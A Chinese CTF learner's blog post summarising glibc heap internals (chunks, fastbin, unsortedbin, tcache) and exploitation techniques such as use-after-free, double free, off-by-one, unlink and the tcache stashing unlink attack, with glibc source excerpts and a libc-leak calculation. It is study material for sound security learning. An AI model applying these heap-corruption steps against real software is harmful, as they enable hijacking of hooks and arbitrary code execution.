<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>glibc_final | 云上小屋</title><meta name="author" content="c10uds"><meta name="copyright" content="c10uds"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="对glibc的一些总结">
<meta property="og:type" content="article">
<meta property="og:title" content="glibc_final">
<meta property="og:url" content="http://example.com/2023/08/19/glibc-final/index.html">
<meta property="og:site_name" content="云上小屋">
<meta property="og:description" content="对glibc的一些总结">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/default_top_img.png">
<meta property="article:published_time" content="2023-08-19T08:37:29.000Z">
<meta property="article:modified_time" content="2023-11-03T17:44:18.268Z">
<meta property="article:author" content="c10uds">
<meta property="article:tag" content="glibcLearning">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/default_top_img.png"><link rel="shortcut icon" href="/img/OIP-C.jpg"><link rel="canonical" href="http://example.com/2023/08/19/glibc-final/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'glibc_final',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-04 01:44:18'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="云上小屋" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default_top_img.png')"><nav id="nav"><span id="blog-info"><a href="/" title="云上小屋"><span class="site-name">云上小屋</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">glibc_final</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-19T08:37:29.000Z" title="发表于 2023-08-19 16:37:29">2023-08-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-03T17:44:18.268Z" title="更新于 2023-11-04 01:44:18">2023-11-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/glibc/">glibc</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="glibc总结-持续更新ing"><a href="#glibc总结-持续更新ing" class="headerlink" title="glibc总结(持续更新ing)"></a>glibc总结(持续更新ing)</h1><p>学了也有三个月的glibc（其实自己一直在摆烂），感觉glibc不是很有意思，今天写个总结，就把这东西跳过了吧（毕竟看现在各位大爹出的题都是VM，jit这种）</p>
<p>在此我会借鉴很多师傅的文章 <strong>（如果有侵权行为请联系 <a href="mailto:&#x32;&#x32;&#57;&#53;&#x30;&#52;&#48;&#51;&#54;&#56;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#109;">&#x32;&#x32;&#57;&#53;&#x30;&#52;&#48;&#51;&#54;&#56;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#109;</a> 删除）</strong> </p>
<h2 id="Heap的基础知识"><a href="#Heap的基础知识" class="headerlink" title="Heap的基础知识"></a>Heap的基础知识</h2><h2 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h2><p><em>heap</em> 由低地址向高地址增长，与栈相反，在内存分配如下图</p>
<p><img src="/../images/0dc4f7566f290977a7a8af2482101e81-1692503147910.png" alt="img"></p>
<blockquote>
<p>在Linux系统上，程序被载入内存时，内核为用户进程地址空间建立了代码段、数据段和堆栈段，在数据段与堆栈段之间的空闲区域用于动态内存分配。内核数据结构mm_struct中的成员变量start_code和end_code是进程代码段的起始和终止地址，start_d</p>
<p>ata和 end_data是进程数据段的起始和终止地址，start_stack是进程堆栈段起始地址， <strong>start_brk</strong> 是进程动态内存分配起始地址（堆的起始地址），还有一个 brk（堆的当前最后地址），就是动态内存分配当前的终止地址。</p>
</blockquote>
<p>这里涉及到两个函数， <em>brk()</em> 和 <em>sbrk()</em> ，两者通过改变程序间断点( <em>program break</em> )来扩展堆区域的大小，若是不开启ASLR， <em>start_brk</em> 就位于bss后，若是开启ALSR，就会在bss后高地址处随机设置 <em>start_brk</em></p>
<ul>
<li><p>malloc类的函数通过 <em>sbrk()</em> 来进行分配</p>
</li>
<li><p>对于mmap: <em>mmap()</em> 函数将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的<br>大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。 <em>munmap()</em>  执行相反的操<br>作，删除特定地址区域的对象映射。函数的定义如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length)</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h2><p>首先介绍一下chunk的结构，这里拿 <em>ptmalloc源码分析</em> 这本书中的图做个例子</p>
<p><img src="/../images/1692452554531.png" alt="1692452554531"></p>
<p>可以发现，size位有三个标志位</p>
<blockquote>
<p>A:该chunk属于主分配区还是非主分配区域</p>
</blockquote>
<blockquote>
<p>M:该chunk是mmap获得还是非mmap获得</p>
</blockquote>
<blockquote>
<p>P:prev_chunk是否在使用中,只有p&#x3D;0时，prev_size才有效，否则可以被共用(如下)</p>
</blockquote>
<p><strong>注意：</strong>chunk的size存在内存对齐，分配时 <em>size&#x3D;size+0x10</em> 因为要加上chunk头，并且存在空间复用，例如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样子获得的chunk1，chunk2的大小均为0x20。</p>
<h3 id="当chunk被释放后"><a href="#当chunk被释放后" class="headerlink" title="当chunk被释放后"></a>当chunk被释放后</h3><p><img src="/../images/1692453011611.png" alt="1692453011611"></p>
<p>可以看到，原本的chunk的data区域被覆盖，多了四个新东西 <em>FD，BK，FD_nextsize，BK_nextsize</em></p>
<p>其中fd指向链表中的下一个chunk，bk指向链表中上一个chunk。fd_nextsize和bk_nextsize比较特殊，只存在于largebin中，这是由于largebin比较独特的储存方式，我们稍后再讲</p>
<h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><p><img src="/../images/1692503379324.png" alt="1692503379324"></p>
<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><ol>
<li>LIFO，例如链表中存在 <em>C-&gt;B-&gt;A</em> ，free(D)后，会出现 <em>D-&gt;C-&gt;B-&gt;A</em> 再次malloc时，也会优先取出D</li>
<li>由于fastbin是为了一些小的碎片化的chunk设立的，在chunk进入fastbin时，P并不变为1</li>
<li>fastbin链表的最小值为0x20，最大值为0x80(默认)，公差为0x10，在申请加入fastbin时，不会对 <em>prev_size</em> 进行检查，但是会对 <em>size</em> 的合法性进行检查</li>
<li>当申请一个堆块大于smallbin的最小大小时，会触发 <em>malloc_consolidate()</em> ，他会首先把fastbin中相邻的块 <em>(指物理地址相邻)</em> 进行合并，合并后放入unsortedbin中，随后，为了分配申请的chunk，会对unsortedbin进行遍历，然后将其归为到smallbin等链表中，使得fastbin清空</li>
<li>若是free后的chunk于相邻的chunk合并后的大小大于 <em>FASTBIN_CONSOLIDATION_THRESHOLD</em> (包括与 <em>topchunk</em> 的合并)，都会触发 <em>malloc_consolidate()</em> ,从而清空fastbin</li>
</ol>
<h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><ol>
<li><p>双向链表，FIFO</p>
</li>
<li><p>chunk被放入smallbin，largebin之前，一定会被放到unsortedbin，之后通过整合分配再分配到各自的链表中</p>
</li>
<li><p>unsortedbin常用来泄露libc，当unsortedbin中只存在1个chunk的时候，FD和BK都会指向 <em>&lt;main_arena+88&gt;</em> 的地方，此时若可以进行show等操作，便可以把libc泄露出来，可以直接vmmap减去偏移即可。也可以利用规律，64位中， <em>malloc_hook</em> 与 <em>main_arena</em> 相差0x10，32位下该偏移为0x18</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - <span class="number">88</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><ol>
<li>双向链表，FIFO</li>
<li>size:0x20-0x3F0</li>
</ol>
<h3 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h3><ol>
<li><p>双链表，FIFO</p>
</li>
<li><p>largebin比较特殊，多出了 <em>fd_nextsize，bk_nextsize</em>,这两个指针导致largebin的存储存在横向和纵向链表，这是由于largebin不同于其他链表储存的方式，largebin每个链表中储存的是一定范围内的chunk<img src="/../images/1345812086_6124-1692514017441.png" alt="1345812086_6124"></p>
<p>上图中可以发现，在同一个bin中，通过 <em>fd_nextsize and bk_nextsize</em> 链接不同大小的chunk，相同大小的chunk通过 <em>fd &amp; bk</em> 进行链接</p>
</li>
</ol>
<h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><ol>
<li><em>libc-2.27</em> 引入，LIFO，单向链表</li>
<li>每个bin存放的大小相同且最多7个，存在 <em>tcache_prethread_struct</em> 结构体，该结构体位于heap首块内存，大小为 <em>0x250</em> ，可以通过一定方式修改这个chunk中记录的tcache的数量来达到释放到unsortedbin中的效果</li>
<li>从 <em>fastbin&#x2F;smallbin</em> 中取出一个chunk，剩下的chunk会放到 <em>tcache</em> 中，直到达到 <em>tcache</em> 的上限，在从smallbin中移动到tcache中，除了第一个chunk的fd会被检查之外，其余的chunk都会缺失了 <em>__glibc_unlikely(bck-&gt;fd!&#x3D;victim)</em> 的双向链表完整性的检查</li>
</ol>
<h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><h3 id="Use-After-Free-UAF"><a href="#Use-After-Free-UAF" class="headerlink" title="Use_After_Free(UAF)"></a>Use_After_Free(UAF)</h3><p><em>uaf</em> 是比较常见的漏洞，触发点为free了chunk之后并没有指针进行置0，uaf可以导致show fd等内容，泄露重要内容以及doublefree等</p>
<h4 id="Double-free"><a href="#Double-free" class="headerlink" title="Double_free"></a>Double_free</h4><ol>
<li><strong>libc2.23下的double_free：</strong><ol>
<li><em>fastbin：</em> 对于fastbin来说，若是free的chunk雨FastbinY的首个chunk相同，就会报错，所以我们可以利用另外的一个chunk进行doublefree，例如首先构成 <em>B-&gt;A</em> 之后再次free(A)，就会形成 <em>A-&gt;B-&gt;A</em> 之后申请A，对A进行edit，就可以完成任意地址的分配，<strong>常常通过修改malloc_hook为one_gadget的方式来getshell</strong></li>
</ol>
</li>
<li><strong>libc2.27下的double_free：</strong> <ol>
<li><em>tcache：</em>对于tcache来说，double_free显然更简单一点，为了追求运行速度，tcache对doublefree并没有过多的检查，我们直接修改next即可 </li>
<li>对于 <em>A-&gt;A</em> 可以通过一次malloc(A)，获得edit的权利，然后仿造 <em>fastbinAttack</em> 进行攻击， <strong>在2.27下常修改free_hook</strong> 但是由于申请了三次而只释放了两次，会导致 <em>tcache_count</em> 变为0xff(-1)</li>
</ol>
</li>
<li><strong>libc高版本的double_free：</strong><ol>
<li>首先对于 <em>tcache</em> 来说，tcache在 <strong>libc2.29</strong> 下加入了key值，通过key值来判断是否存在doublefree，但是key值可以用一定方法绕过，常见的有 <strong>通过edit修改key值&#x2F;houseofbotcake</strong></li>
</ol>
</li>
<li>若存在edit，可以直接进行edit(这是最简单的uaf)，个人观点认为uaf和double_free本质是一家的，当无法对free掉的chunk进行edit的时候，double_free更加方便</li>
</ol>
<h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p><em>off_by_one</em> 也是低版本中比较常见的漏洞，根据个人经验来说 <strong>通常出现出题人自己写的读入函数容易出现该漏洞</strong> 常常修改prev_inuse和修改prev_size一起利用，从而达到 <em>overlapping</em> 的效果</p>
<p>在libc2.29之后加入如下检测，会导致unlink无法使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入*/</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><em>unlink</em> 属于比较古早的利用方法,源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                         </span></span><br><span class="line">    <span class="comment">//判断chunk p的大小，是否与下一个chunk 的prev_size相等</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>); </span><br><span class="line">    <span class="comment">//让FD指向p的下一个chunk，BK指向p的上一个chunk</span></span><br><span class="line">    FD = P-&gt;fd;                                   </span><br><span class="line">    BK = P-&gt;bk;                                   </span><br><span class="line">    <span class="comment">//以上是，chunk的大小在small bin范围内的断链操作</span></span><br><span class="line">    <span class="comment">//以下是，large bin，的断链操作，首先判断FD的bk，与BK的fd是否同时指向p</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);               </span><br><span class="line">    <span class="keyword">else</span> &#123;                                    </span><br><span class="line">        <span class="comment">//首先进行初步断链，使FD的bk指向BK的fd，BK的fd指向FD，只是堆fd,bk的断链操作</span></span><br><span class="line">        FD-&gt;bk = BK;                                  </span><br><span class="line">        BK-&gt;fd = FD;                                  </span><br><span class="line">        <span class="comment">//以下使堆bk_nextsize,fd_nextsize的断链操作（large bin有两个双向链表，fd，bk用来</span></span><br><span class="line">        <span class="comment">//进行FIFO操作，bk_nextsize,fd_nextsize是根据堆块的大小进行排序的链表）</span></span><br><span class="line">        <span class="comment">//以下第一个if判断p的chunk是否在small范围内</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                  </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;             </span><br><span class="line">            <span class="comment">//判断chunk p的下一个chunk的上一个节点，以及上一个chunk的下一个节点是不是p</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)         </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))     </span><br><span class="line">          malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);    </span><br><span class="line">          <span class="comment">//以下是luoarge bin的断链操作，首先判断chunk p的下下一个chunk的fd_nextsize是否为空</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                     </span><br><span class="line">            <span class="comment">//p的下下一个chunk的fd_nextsize为空</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                       </span><br><span class="line">                <span class="comment">//判断是否只有一个chunk p,是则如下</span></span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              </span><br><span class="line">                <span class="keyword">else</span> &#123;                                 </span><br><span class="line">                <span class="comment">//不是以下操作，四个指针，正常的双向链表的断链操作</span></span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  </span><br><span class="line">                  &#125;                                </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                 </span><br><span class="line">              <span class="comment">//p的下下一个chunk的fd_nextsize不为空，直接断链</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              </span><br><span class="line">              &#125;                                    </span><br><span class="line">          &#125;                                    </span><br><span class="line">      &#125;                                        </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>具体的操作可以看我的另外一篇博客 glibclearning，总的来说，我认为unlink主要是写入的地址是根据列表去找，这样子就可以实现 *<em>ptr&#x3D;&amp;(ptr-0x18)</em>,从而达到向ptr写入就是向ptr-0x18写入，再通过覆盖修改ptr为某个函数的got表，从而达到函数劫持的效果</p>
<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><h4 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore:"></a>house of lore:</h4><p>修改一个small bin的某个freed chunk的bk为fakechunk，并且修改fakechunk的fd为该freed chunk用于绕过glibc的检查，就可以成功的从small bin中申请该chunk</p>
<p>在高版本的glibc引用tcache之后，该漏洞就更容易利用，因为在从smallbin中返回一个chunk，并且将剩下的chunk放到tcache中，只会对第一个chunk的fd进行检查，后续的fd并不检查，这样子就很容易造成任意的读写，并且已知calloc会越过tcache直接从smallbin中获得chunk。</p>
<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><ol>
<li><p>假设目前<code>tcache bin</code>中已经有五个堆块，并且相应大小的<code>small bin</code>中已经有两个堆块，由<code>bk</code>指针连接为：<code>chunk_A&lt;-chunk_B</code>。</p>
</li>
<li><p>利用漏洞修改<code>chunk_A</code>的<code>bk</code>为<code>fake chunk</code>，并且修改<code>fake chunk</code>的<code>bk</code>为<code>target_addr - 0x10</code>。</p>
</li>
<li><p>通过<code>calloc()</code>越过<code>tcache bin</code>，直接从<code>small bin</code>中取出<code>chunk_B</code>返回给用户，并且会将<code>chunk_A</code>以及其所指向的<code>fake chunk</code>放入<code>tcache bin</code>（这里只会检测<code>chunk_A</code>的<code>fd</code>指针是否指向了<code>chunk_B</code>）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">    &amp;&amp; (tc_victim = last (bin) ) != bin) <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span> (tc_victim != <span class="number">0</span>) <span class="comment">//成功获取了chunk</span></span><br><span class="line"> &#123;</span><br><span class="line">     bck = tc_victim-&gt;bk; <span class="comment">//在这里bck是fake chunk的bk</span></span><br><span class="line">     <span class="comment">//设置标志位</span></span><br><span class="line">     set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">     <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">         set_non_main_arena (tc_victim);</span><br><span class="line"> </span><br><span class="line">     bin-&gt;bk = bck;</span><br><span class="line">     bck-&gt;fd = bin; <span class="comment">//关键处</span></span><br><span class="line"> </span><br><span class="line">     tcache_put (tc_victim, tc_idx); <span class="comment">//将其放入到tcache中</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>fake chunk</code>放入<code>tcache bin</code>之前，执行了<code>bck-&gt;fd = bin;</code>的操作（这里的<code>bck</code>就是<code>fake chunk</code>的<code>bk</code>，也就是<code>target_addr - 0x10</code>），故<code>target_addr - 0x10</code>的<code>fd</code>，也就<code>target_addr</code>地址会被写入一个与<code>libc</code>相关大数值（可利用）。</p>
</li>
<li><p>再申请一次，就可以从<code>tcache</code>中获得<code>fake chunk</code>的控制权。</p>
</li>
</ol>
